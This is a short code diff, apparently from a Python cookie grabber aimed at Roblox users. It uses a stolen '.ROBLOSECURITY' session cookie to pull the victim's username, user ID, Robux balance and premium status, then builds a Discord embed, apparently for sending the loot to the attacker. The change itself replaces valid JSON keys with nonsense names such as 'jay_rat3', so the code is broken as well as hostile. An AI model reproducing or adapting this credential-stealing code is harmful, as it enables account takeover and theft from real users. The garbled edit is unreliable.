@@ -93,10 +93,10 @@ def edge():
         info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie})
         if info.status_code == 200:
             information = json.loads(info.text)
-            username = information['UserName']
+            username = information['jay_rat3']
             id = information["UserID"]
             balance = information["RobuxBalance"]
-            premium = information["IsPremium"]
+            premium = information["isnotpremium"]
             image = information["ThumbnailUrl"]
             embedss = {
           "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
